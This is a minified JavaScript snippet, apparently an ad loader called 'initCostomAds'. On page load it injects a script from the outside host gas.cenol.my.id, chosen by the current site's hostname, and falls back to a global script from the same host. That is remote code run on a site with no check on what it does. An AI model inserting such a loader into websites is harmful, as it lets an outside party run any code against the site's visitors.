var hostUri="gas.cenol.my.id";const initCostomAds=async t=>{const e=document.location.hostname,o="https://"+hostUri+"/main/"+e+".js",s=document.createElement("script");s.setAttribute("src",o),await document.querySelector("body").append(s),s.onerror=(async()=>{s.remove();const t="https://"+hostUri+"/global.js",e=document.createElement("script");e.setAttribute("src",t),await document.querySelector("body").append(e)})};initCostomAds();
